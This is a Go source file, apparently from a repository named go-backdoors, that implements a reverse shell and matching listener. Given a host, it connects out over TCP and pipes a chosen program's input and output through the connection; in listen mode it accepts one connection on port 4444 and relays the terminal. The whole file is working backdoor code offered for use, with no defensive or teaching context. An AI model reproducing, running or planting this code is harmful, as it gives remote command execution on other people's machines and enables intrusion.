// https://github.com/LukeDSchenk/go-backdoors/blob/master/revshell.go

package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

const proto = "tcp"

type Progress struct {
	bytes uint64
}

func main() {
	var host, command string
	var port int
	var listen bool

	flag.StringVar(&host, "host", "", "host to connect to")
	flag.IntVar(&port, "port", 4444, "port to connect to")
	flag.StringVar(&command, "exec", "", "command to execute")
	flag.BoolVar(&listen, "listen", false, "listen for incoming connections")

	flag.Parse()

	if listen && command == "" {
		StartServer(proto, port)
	} else if host != "" {
		StartRevShell(proto, host, port, command)
	} else {
		flag.Usage()
	}

}

func createShell(connection net.Conn, command string) {
	message := "successful connection from " + connection.LocalAddr().String()
	_, err := connection.Write([]byte(message + "\n"))
	if err != nil {
		log.Println("An error occurred trying to write to the outbound connection:", err)
		os.Exit(2)
	}

	cmd := exec.Command(command)
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()
}

func StartServer(proto string, port int) {
	ln, err := net.Listen(proto, fmt.Sprintf(":%d", port))
	if err != nil {
		log.Fatalln(err)
	}
	log.Println("Listening on", fmt.Sprintf("%s:%d", proto, port))
	con, err := ln.Accept()
	if err != nil {
		log.Fatalln(err)
	}
	log.Printf("[%s]: Connection has been opened\n", con.RemoteAddr())
	TransferStreams(con)
}

func StartRevShell(proto string, host string, port int, command string) {
	connection, err := net.Dial(proto, fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		log.Println("An error occurred trying to connect to the target:", err)
		os.Exit(1)
	}

	log.Println("Successfully connected to the target")

	createShell(connection, command)
}

func TransferStreams(con net.Conn) {
	c := make(chan Progress)

	// Read from Reader and write to Writer until EOF
	copy := func(r io.ReadCloser, w io.WriteCloser) {
		defer func() {
			r.Close()
			w.Close()
		}()
		n, err := io.Copy(w, r)
		if err != nil {
			log.Printf("[%s]: ERROR: %s\n", con.RemoteAddr(), err)
		}
		c <- Progress{bytes: uint64(n)}
	}

	go copy(con, os.Stdout)
	go copy(os.Stdin, con)

	p := <-c
	log.Printf("[%s]: Connection has been closed by remote peer, %d bytes has been received\n", con.RemoteAddr(), p.bytes)
	p = <-c
	log.Printf("[%s]: Local peer has been stopped, %d bytes has been sent\n", con.RemoteAddr(), p.bytes)
}
